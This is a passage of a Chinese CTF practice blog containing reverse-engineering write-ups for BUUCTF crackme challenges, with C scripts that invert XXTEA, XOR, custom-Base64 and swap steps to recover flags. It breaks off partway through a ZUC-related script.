    <content type="html"><![CDATA[<p>Buuctf刷题记录</p><span id="more"></span> <h1 id="红帽杯-XX"><a class="header-anchor" href="#红帽杯-XX">¶</a>红帽杯-XX</h1><h2 id="考点"><a class="header-anchor" href="#考点">¶</a>考点</h2><p>xxtea、异或、换位</p><h2 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h2><p>整个过程就是取前四个输入作为密钥，先进行XXTEA加密，然后位置互换混淆，最后进行异或加密</p><h3 id="取密钥"><a class="header-anchor" href="#取密钥">¶</a>取密钥</h3><p>这里判断取出前四位，判断是否为数组内的元素，因为如果不是的话，最后V11=V14退出程序</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329798015.png" alt=""></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329952441.png" alt="v6元素"></p><p>取出地址中存储的字符，保证其不为0，下面那个循环是将取出的key末尾填充0</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330081892.png" alt=""></p><p>我们的key是int型，这里传参时强制转为char型</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330189857.png" alt=""></p><p>函数内部起始段是将我们传入的key转为int型，转换大小端序，因为原本是flag，转为int之后就变成了galf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330259305.png" alt=""></p><p>然后xxtea加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330294507.png" alt=""></p><h3 id="打乱位置"><a class="header-anchor" href="#打乱位置">¶</a>打乱位置</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330367612.png" alt=""></p><h3 id="异或"><a class="header-anchor" href="#异或">¶</a>异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330508850.png" alt="index初始值"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330454278.png" alt=""></p><p>这段的逻辑就是只要是3的倍数就取出来异或，index从1开始，所以0、1、2下标的字符都不会被加密，3、4、5进行一次加密，异或的值为下标为0的enc_flag，6、7、8则两次，异或的值为下标为0、1的加密后的字符，依次往后，直到21、22、23，此时异或前六位加密字符</p><h2 id="脚本"><a class="header-anchor" href="#脚本">¶</a>脚本</h2><p>xxtea</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_MX (((xxtea_z&gt;&gt;5^xxtea_y<span class="meta-string">&lt;&lt;2) + (xxtea_y&gt;</span>&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* xxtea_origin, <span class="keyword">int</span> xxtea_n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> xxtea_key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">uint32_t</span> xxtea_y, xxtea_z, xxtea_sum;</span><br><span class="line">    <span class="keyword">unsigned</span> xxtea_p, xxtea_rounds, xxtea_e;</span><br><span class="line">    <span class="keyword">if</span> (xxtea_n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = <span class="number">0</span>;</span><br><span class="line">        xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_sum += xxtea_DELTA;</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = <span class="number">0</span>; xxtea_p &lt; xxtea_n - <span class="number">1</span>; xxtea_p++)</span><br><span class="line">            {</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p + <span class="number">1</span>];</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>] += xxtea_MX;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (xxtea_n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_n = -xxtea_n;</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = xxtea_rounds * xxtea_DELTA;</span><br><span class="line">        xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = xxtea_n - <span class="number">1</span>; xxtea_p &gt; <span class="number">0</span>; xxtea_p--)</span><br><span class="line">            {</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p - <span class="number">1</span>];</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>] -= xxtea_MX;</span><br><span class="line">            xxtea_sum -= xxtea_DELTA;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DC</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">6</span>] = { <span class="number">0x40CEA5BC</span>,<span class="number">0xE7B2B2F4</span>,<span class="number">0x129D12A9</span>,<span class="number">0x5BC810AE</span>,<span class="number">0x1D06D73D</span>,<span class="number">0xDCF870DC</span> };</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>] = { (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x67616c66</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x0</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x0</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">0x0</span> };</span><br><span class="line">    xxtea(enc, <span class="number">-6</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">0</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">1</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">2</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">3</span>]);</span><br><span class="line">    }<span class="comment">//强制转为char然后依次取出，这样就不会逆序了</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>异或和位置互换</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> data[<span class="number">24</span>] = {</span><br><span class="line"><span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">23</span>; i &gt;= <span class="number">0</span>; --i)<span class="comment">//因为最后的加密数据和前面的有关系，所以要从前往后</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">6</span> - count; j &gt;= <span class="number">0</span>; --j)<span class="comment">//并且分为了多轮，除去前三个不需要异或，剩下7组，又是小于8，所以从下标为6开始</span></span><br><span class="line">{</span><br><span class="line">data[i] ^= data[j];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">count++;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">char</span> encode_flag2[<span class="number">24</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="comment">//交换还原</span></span><br><span class="line">encode_flag2[<span class="number">2</span>]= *data;</span><br><span class="line">*encode_flag2= data[<span class="number">1</span>];</span><br><span class="line">encode_flag2[<span class="number">3</span>]= data[<span class="number">2</span>];</span><br><span class="line">encode_flag2[<span class="number">1</span>]= data[<span class="number">3</span>];</span><br><span class="line">encode_flag2[<span class="number">6</span>]= data[<span class="number">4</span>];</span><br><span class="line">encode_flag2[<span class="number">4</span>]= data[<span class="number">5</span>];</span><br><span class="line">encode_flag2[<span class="number">7</span>]= data[<span class="number">6</span>];</span><br><span class="line">encode_flag2[<span class="number">5</span>]= data[<span class="number">7</span>];</span><br><span class="line">encode_flag2[<span class="number">10</span>]= data[<span class="number">8</span>];</span><br><span class="line">encode_flag2[<span class="number">8</span>]= data[<span class="number">9</span>];</span><br><span class="line">encode_flag2[<span class="number">11</span>]= data[<span class="number">10</span>];</span><br><span class="line">encode_flag2[<span class="number">9</span>]= data[<span class="number">11</span>];</span><br><span class="line">encode_flag2[<span class="number">14</span>]= data[<span class="number">12</span>];</span><br><span class="line">encode_flag2[<span class="number">12</span>]= data[<span class="number">13</span>];</span><br><span class="line">encode_flag2[<span class="number">15</span>]= data[<span class="number">14</span>];</span><br><span class="line">encode_flag2[<span class="number">13</span>]= data[<span class="number">15</span>];</span><br><span class="line">encode_flag2[<span class="number">18</span>]= data[<span class="number">16</span>];</span><br><span class="line">encode_flag2[<span class="number">16</span>]= data[<span class="number">17</span>];</span><br><span class="line">encode_flag2[<span class="number">19</span>]= data[<span class="number">18</span>];</span><br><span class="line">encode_flag2[<span class="number">17</span>]= data[<span class="number">19</span>];</span><br><span class="line">encode_flag2[<span class="number">22</span>]= data[<span class="number">20</span>];</span><br><span class="line">encode_flag2[<span class="number">20</span>]=data[<span class="number">21</span>] ;</span><br><span class="line">encode_flag2[<span class="number">23</span>]= data[<span class="number">22</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%X,"</span>, encode_flag2[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="安洵杯-2019-crackMe"><a class="header-anchor" href="#安洵杯-2019-crackMe">¶</a>[安洵杯 2019]crackMe</h1><h2 id="考点-v2"><a class="header-anchor" href="#考点-v2">¶</a>考点</h2><p>SM4、Base64变表加密、换位</p><h2 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h2><p>这里我和别人不一样，我运行不了程序，所以没办法动调，只能X查看交叉引用</p><p>进去定位到主加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333197817.png" alt=""></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333231195.png" alt=""></p><h3 id="初始化密钥"><a class="header-anchor" href="#初始化密钥">¶</a>初始化密钥</h3><p>对key查看交叉引用，可以进入这里，看一下对赋值后的字符串处理</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333257430.png" alt=""></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333345804.png" alt=""></p><p>通过FindCrypt可以知道是SM4加密，所以这一段就是初始化密钥了</p><h3 id="SM4加密"><a class="header-anchor" href="#SM4加密">¶</a>SM4加密</h3><p>回到encode函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333436418.png" alt=""></p><p>可以发现最后将加密后的字符串给到了final</p><h3 id="Base64加密"><a class="header-anchor" href="#Base64加密">¶</a>Base64加密</h3><p>对final查看交叉引用，发现对其进行了加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333588664.png" alt=""></p><p>这里解释一下一些东西</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333635363.png" alt=""></p><blockquote><p><strong>我们base64就是将三个字符也就是24位转为4个6位，做索引，这里使用移位直接将三个字符成为一个int型，也就是每个左移8位，而待会取出的时候右移六位即可取出，实现了8位与6位的转换，比较有意思</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333792600.png" alt=""></p><p>在红框函数中将传入的6位索引进行+24，也就是(index+24)%64，我们可以将base64表整体左移，就相当于index+24了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333896782.png" alt=""></p><p>再对base64表查看交叉引用，发现了将大小写转换</p><h3 id="换位"><a class="header-anchor" href="#换位">¶</a>换位</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333519884.png" alt=""></p><p>可以看到这里将最后用来对比的字符串每两个字符进行互换</p><h2 id="脚本-v2"><a class="header-anchor" href="#脚本-v2">¶</a>脚本</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> base64_table[] = <span class="string">"yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx"</span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">base64_encode</span><span class="params">(<span class="keyword">char</span> code[], <span class="keyword">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> code_len = <span class="built_in">strlen</span>(code);</span><br><span class="line"><span class="keyword">int</span> str_len ;</span><br><span class="line"><span class="keyword">if</span> (code_len%<span class="number">3</span>)</span><br><span class="line">{</span><br><span class="line">str_len = (code_len / <span class="number">3</span> + <span class="number">1</span> ) * <span class="number">4</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">str_len = (code_len / <span class="number">3</span>) * <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, i_ = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; code_len; i += <span class="number">3</span>, i_ += <span class="number">4</span>)</span><br><span class="line">{</span><br><span class="line">str[i_] = base64_table[code[i]&gt;&gt; <span class="number">2</span>];</span><br><span class="line">str[i_ + <span class="number">1</span>] = base64_table[((code[i] &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">4</span>) | ((code[i + <span class="number">1</span>] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">str[i_ + <span class="number">2</span>] = base64_table[((code[i+<span class="number">1</span>] &amp; <span class="number">0x0f</span>) &lt;&lt; <span class="number">2</span>) | ((code[i + <span class="number">2</span>] &amp; <span class="number">0xc0</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">str[i_ + <span class="number">3</span>] = base64_table[(code[i + <span class="number">2</span>] &amp; <span class="number">0x3f</span>)];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (code_len % <span class="number">3</span> == <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">str[i_<span class="number">-1</span>] = <span class="string">'='</span>;</span><br><span class="line">str[i_ - <span class="number">2</span>] = <span class="string">'='</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (code_len % <span class="number">3</span> == <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line">str[i_<span class="number">-1</span>] = <span class="string">'='</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findIndex</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">char</span> b64_table[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (c == b64_table[i])</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">int</span> str_len;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">base64_decode</span><span class="params">(<span class="keyword">char</span> code[], <span class="keyword">char</span> str[], <span class="keyword">char</span> b64_table[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">char</span> memstr[<span class="number">200</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="built_in">memcpy</span>(memstr, code, <span class="built_in">strlen</span>(code));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(code);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(code, <span class="string">"=="</span>))</span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(code, <span class="string">"="</span>))</span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, i_ = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>, i_ += <span class="number">3</span>)</span><br><span class="line">{</span><br><span class="line">str[i_] = (findIndex(memstr[i], b64_table) &lt;&lt; <span class="number">2</span>) | (findIndex(memstr[i + <span class="number">1</span>], b64_table) &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">str[i_+<span class="number">1</span>]= (findIndex(memstr[i+<span class="number">1</span>], b64_table)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">4</span> | (findIndex(memstr[i + <span class="number">2</span>], b64_table) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">str[i_ + <span class="number">2</span>] = (findIndex(memstr[i + <span class="number">2</span>], b64_table) &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span> | (findIndex(memstr[i + <span class="number">3</span>], b64_table));</span><br><span class="line">}</span><br><span class="line">str[str_len] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">char</span> code[<span class="number">100</span>] = <span class="string">"1UTAOIkpyOSWGv/mOYFY4R=="</span>;</span><br><span class="line"><span class="keyword">char</span> decode[<span class="number">100</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">char</span> encode[<span class="number">100</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="comment">//两位交换</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(code); i += <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">char</span> v2 = code[i];</span><br><span class="line">code[i] = code[i + <span class="number">1</span>];</span><br><span class="line">code[i + <span class="number">1</span>] = v2;                         <span class="comment">// 每两个之间进行交换</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*base64_encode(code, encode); </span></span><br><span class="line"><span class="comment">printf("%s\n", encode);*/</span></span><br><span class="line">base64_decode(code, decode,base64_table);</span><br><span class="line"><span class="keyword">if</span> (decode == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str_len; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, decode[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>得到59D095290DF2400614F48D276906874E</p><p>SM4解密</p><p><a href="https://the-x.cn/cryptography/Sm4.aspx">https://the-x.cn/cryptography/Sm4.aspx</a></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650334038696.png" alt=""></p><h1 id="SWPU2019-ReverseMe"><a class="header-anchor" href="#SWPU2019-ReverseMe">¶</a>[SWPU2019]ReverseMe</h1><h2 id="考点-v3"><a class="header-anchor" href="#考点-v3">¶</a>考点</h2><p>异或、ZUC算法</p><h2 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h2><p>先异或SWPU_2019_CTF，再异或ZUC算法生成的数据</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350768675.png" alt="异或"></p><p>ZUC算法生成异或的值</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350800049.png" alt=""></p><p>unsigned int 的异或，通过动调也可以知道</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350725823.png" alt="xor"></p><h2 id="脚本-v3"><a class="header-anchor" href="#脚本-v3">¶</a>脚本</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[<span class="number">8</span>] = 